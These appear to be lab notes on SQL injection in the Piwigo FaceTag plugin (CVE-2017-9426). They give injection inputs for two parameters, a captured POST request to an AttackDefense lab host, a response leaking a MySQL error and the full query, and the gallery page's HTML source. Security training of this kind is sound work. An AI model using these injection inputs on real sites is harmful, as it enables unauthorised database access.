
1) facetag.changeTag (Target parameter : imageId=14')

Any visitor or registed user can perform this.
 
- imageId=-1&imageId=14'&name=touhid&top=0.1280807957504735&left=0.5839646464646465&width=0&height=0

2) facetag.listTags (Target parameter : imageId=-1')

[TOOLS]

- Burp Suite

[LINKS]

- https://www.exploit-db.com/exploits/42098/
- https://www.exploit-db.com/exploits/42094/
- https://www.youtube.com/watch?v=MVCe_zYtFsQ
- https://www.youtube.com/watch?v=BrGX8dWyqUA
- https://www.youtube.com/results?search_query=Piwigo+FaceTag+Plugin
- https://www.google.com/search?rlz=1C5CHFA_enDO725DO725&ei=XNK4W97_PMWu5wKS5LCQAw&q=Piwigo+Face+Tag+Plugin+%5BCVE-2017-9426%5D+write+up&oq=Piwigo+Face+Tag+Plugin+%5BCVE-2017-9426%5D+write+up&gs_l=psy-ab.3...2878504.2883496.0.2883942.16.13.3.0.0.0.541.2357.0j10j0j1j0j1.12.0....0...1c.1j2.64.psy-ab..1.1.164...33i21k1.0.Zemx7VltvqQ


[REQUEST]

POST /ws.php?format=json&method=facetag.listTags HTTP/1.1
Host: u0fznhy6xnu9a81ub47sxg6ki.public1.attackdefenselabs.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://u0fznhy6xnu9a81ub47sxg6ki.public1.attackdefenselabs.com/picture.php?/2/category/1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 12
DNT: 1
Connection: close
Cookie: pwg_id=uem2onu14l9tc1qiph68nbagq0

imageId=-1')

[RESPONSE]

HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Content-Length: 917
Content-Type: text/html
Date: Sat, 06 Oct 2018 16:55:50 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Connection: close

<pre><br />
<b>Warning</b>:  [mysql error 1064] You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\') AND EXISTS (SELECT 1 FROM piwigo_image_tag imgTag WHERE imgTag.`image_id` = ' at line 1
SELECT imgFaceTag.`tag_id`, imgFaceTag.`top`, imgFaceTag.`left`, imgFaceTag.`width`, imgFaceTag.`height`, tags.`name` FROM `piwigo_image_facetag` imgFaceTag , piwigo_tags tags WHERE imgFaceTag.`tag_id` = tags.`id` AND imgFaceTag.`image_id` = -1\') AND EXISTS (SELECT 1 FROM piwigo_image_tag imgTag WHERE imgTag.`image_id` = imgFaceTag.`image_id` AND imgTag.`tag_id` = imgFaceTag.`tag_id`); in <b>/app/include/dblayer/functions_mysqli.inc.php</b> on line <b>830</b><br />
</pre><br />
<b>Fatal error</b>:  Call to a member function fetch_assoc() on a non-object in <b>/app/include/dblayer/functions_mysqli.inc.php</b> on line <b>211</b><br />


[SOURCE CODE]


<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="generator" content="Piwigo (aka PWG), see piwigo.org">

 
<meta name="description" content="test">

<title>test | Just another Piwigo gallery</title>
<link rel="shortcut icon" type="image/x-icon" href="themes/default/icon/favicon.ico">

<link rel="start" title="Home" href="/" >
<link rel="search" title="Search" href="search.php" >


<link rel="canonical" href="index.php?/category/1">

       
	<!--[if lt IE 7]>
		<link rel="stylesheet" type="text/css" href="themes/default/fix-ie5-ie6.css">
	<![endif]-->
	<!--[if IE 7]>
		<link rel="stylesheet" type="text/css" href="themes/default/fix-ie7.css">
	<![endif]-->
	
       





<!--[if lt IE 8]>
		<link rel="stylesheet" type="text/css" href="themes/elegant/fix-ie7.css">
	<![endif]-->
    

<!-- BEGIN get_combined -->
<link rel="stylesheet" type="text/css" href="_data/combined/wd0mrr.css">


<!-- END get_combined -->

<!--[if lt IE 7]>
<script type="text/javascript" src="themes/default/js/pngfix.js"></script>
<![endif]-->

<style type="text/css">
.thumbnails SPAN, .thumbnails .wrap2 A, .thumbnails LABEL{ width: 146px; } .thumbnails .wrap2{ height: 147px; }   .thumbLegend {font-size: 90%}
.browsePath ul li span a:before, .browsePath ul li.last:before
{
  content: " / ";
}</style>
</head>

<body id="theCategoryPage">

<div id="the_page">


<div id="theHeader"><h1>Just another Piwigo gallery</h1>

<p>Welcome to my photo gallery</p></div>


<div id="menubar">
	<dl id="mbCategories">
<dt>
	<a href="index.php?/categories">Albums</a>
</dt>
<dd>
  <ul>
    <li class="selected">
      <a href="index.php?/category/1"  title="1 photo in this album">test</a>
      <span class="menuInfoCat" title="1 photo in this album">[1]</span>
  </li></ul>

	<p class="totalImages">1 photo</p>
</dd>

	</dl>
	<dl id="mbTags">
<dt>Related keywords</dt>
<dd>
	<div id="menuTagCloud">
		<span> <a class="tagLevel3" href=  "index.php?/tags/1-touchid" title="display photos linked to this keyword">  touchid</a></span>

	</div>
</dd>

	</dl>
	<dl id="mbSpecials">
<dt>Specials</dt>
<dd>
	<ul>  <li><a href="index.php?/favorites" title="display your favourite photos">Your favourites</a></li>  <li><a href="index.php?/most_visited" title="display most visited photos">Most visited</a></li>  <li><a href="index.php?/best_rated" title="display best rated photos">Best rated</a></li>  <li><a href="index.php?/recent_pics" title="display most recent photos">Recent photos</a></li>  <li><a href="index.php?/recent_cats" title="display recently updated albums">Recent albums</a></li>  <li><a href="random.php" title="display a set of random photos" rel="nofollow">Random photos</a></li>  <li><a href="index.php?/created-monthly-calendar" title="display each day with photos, month per month" rel="nofollow">Calendar</a></li>  </ul>
</dd>

	</dl>
	<dl id="mbMenu">
<dt>Menu</dt>
<dd>
	<form action="qsearch.php" method="get" id="quicksearch" onsubmit="return this.q.value!='' && this.q.value!=qsearch_prompt;">
		<p style="margin:0;padding:0">
			<input type="text" name="q" id="qsearchInput" onfocus="if (value==qsearch_prompt) value='';" onblur="if (value=='') value=qsearch_prompt;" style="width:90%">
		</p>
	</form>
	<script type="text/javascript">var qsearch_prompt="Quick search";document.getElementById('qsearchInput').value=qsearch_prompt;</script>
	<ul>     <li><a href="tags.php" title="display available keywords">Keywords</a> (1)</li>    <li><a href="search.php" title="search" rel="search">Search</a></li>    <li><a href="comments.php" title="display last user comments">Comments</a> (0)</li>    <li><a href="about.php" title="About this website">About</a></li>    <li><a href="notification.php" title="RSS feed" rel="nofollow">Notification</a></li>   </ul>
</dd>

	</dl>
	<dl id="mbIdentification">
<dt>Identification</dt>
<dd>
  <p>Hello admin !</p>  <ul>    <li><a href="?act=logout">Logout</a></li>   <li><a href="profile.php" title="customise the look of the gallery">Customise</a></li>   <li><a href="admin.php" title="available for administrators only">Administration</a></li>  </ul> 
</dd>

	</dl>
</div><div id="menuSwitcher"></div>




<div id="content" class="content contentWithMenu">
<div class="titrePage">
	<ul class="categoryActions">
		<li><a id="sortOrderLink" title="Sort order" class="pwg-state-default pwg-button" rel="nofollow"> <span class="pwg-icon pwg-icon-sort"></span><span class="pwg-button-text">Sort order</span> </a> <div id="sortOrderBox" class="switchBox"> <div class="switchBoxTitle">Sort order</div>   <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=0" rel="nofollow">Default</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=1" rel="nofollow">Photo title, A &rarr; Z</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=2" rel="nofollow">Photo title, Z &rarr; A</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=3" rel="nofollow">Date created, new &rarr; old</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=4" rel="nofollow">Date created, old &rarr; new</a>  <br>  <span>&#x2714; </span>Date posted, new &rarr; old  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=6" rel="nofollow">Date posted, old &rarr; new</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=7" rel="nofollow">Rating score, high &rarr; low</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=8" rel="nofollow">Rating score, low &rarr; high</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=9" rel="nofollow">Visits, high &rarr; low</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=10" rel="nofollow">Visits, low &rarr; high</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;image_order=11" rel="nofollow">Permissions</a>   </div>  </li>
		<li><a id="derivativeSwitchLink" title="Photo sizes" class="pwg-state-default pwg-button" rel="nofollow"> <span class="pwg-icon pwg-icon-sizes"></span><span class="pwg-button-text">Photo sizes</span> </a> <div id="derivativeSwitchBox" class="switchBox"> <div class="switchBoxTitle">Photo sizes</div>   <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;display=square" rel="nofollow">Square</a>  <br>  <span>&#x2714; </span>Thumbnail  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;display=2small" rel="nofollow">XXS - tiny</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;display=xsmall" rel="nofollow">XS - extra small</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;display=small" rel="nofollow">S - small</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;display=medium" rel="nofollow">M - medium</a>  <br>  <span style="visibility:hidden">&#x2714; </span><a href="index.php?/category/1&amp;display=large" rel="nofollow">L - large</a>   </div>  </li>

		<li id="cmdCaddie"><a href="index.php?/category/1&amp;caddie=1" title="Add to basket" class="pwg-state-default pwg-button">
			<span class="pwg-icon pwg-icon-caddie-add"></span><span class="pwg-button-text">Basket</span>
		</a></li>
		<li id="cmdEditAlbum"><a href="admin.php?page=album-1" title="Edit album" class="pwg-state-default pwg-button">
			<span class="pwg-icon pwg-icon-category-edit"></span><span class="pwg-button-text">Edit</span>
		</a></li>
		<li id="cmdSlideshow"><a href="picture.php?/2/category/1&amp;slideshow=" title="slideshow" class="pwg-state-default pwg-button" rel="nofollow"> <span class="pwg-icon pwg-icon-slideshow"></span><span class="pwg-button-text">slideshow</span> </a></li>
		<li><a href="index.php?/category/1/posted-monthly-list" title="display a calendar by posted date" class="pwg-state-default pwg-button" rel="nofollow"> <span class="pwg-icon pwg-icon-calendar"></span><span class="pwg-button-text">Calendar</span> </a></li>
		<li><a href="index.php?/category/1/created-monthly-list" title="display a calendar by creation date" class="pwg-state-default pwg-button" rel="nofollow"> <span class="pwg-icon pwg-icon-camera-calendar"></span><span class="pwg-button-text">Calendar</span> </a></li>
	</ul>

<h2><a href="/">Home</a> / <a href="index.php?/category/1">test</a> [1]</h2>



</div>










<div class="loader"><img src="themes/default/images/ajax_loader.gif"></div>
<ul class="thumbnails" id="thumbnails">
         <li> <span class="wrap1"> <span class="wrap2"> <a href="picture.php?/2/category/1"> <img class="thumbnail" src="_data/i/upload/2018/09/10/20180910172720-8aa6d698-th.jpg" alt="ha-with-pa-3-min" title="ha-with-pa-3-min (1 visits)"> </a> </span>  <span class="thumbLegend"> <span class="thumbName">ha-with-pa-3-min</span>    </span>  </span> </li> 
</ul>

</div>
<div id="copyright">


  Powered by	<a href="http://piwigo.org" class="Piwigo">Piwigo</a>
  
  - <a href="mailto:admin@gmail.com?subject=A%20comment%20on%20your%20site">Contact webmaster</a>
</div>

</div>

<!-- BEGIN get_combined -->
<script type="text/javascript" src="_data/combined/tvu7kg.js"></script>
<script type="text/javascript">//<![CDATA[

var error_icon = "themes/default/icon/errors_small.png", max_requests = 3;
var p_main_menu = "on", p_pict_descr = "on", p_pict_comment = "off";
  jQuery(document).ready(function() {
      jQuery(".browsePath").jBreadCrumb();
  });
(SwitchBox=window.SwitchBox||[]).push("#sortOrderLink", "#sortOrderBox");
(SwitchBox=window.SwitchBox||[]).push("#derivativeSwitchLink", "#derivativeSwitchBox");
//]]></script>
<script type="text/javascript">
(function() {
var s,after = document.getElementsByTagName('script')[document.getElementsByTagName('script').length-1];
s=document.createElement('script'); s.type='text/javascript'; s.async=true; s.src='themes/default/js/switchbox.js?v2.7.2';
after = after.parentNode.insertBefore(s, after);
})();
</script>
<!-- END get_combined -->

</body>
</html>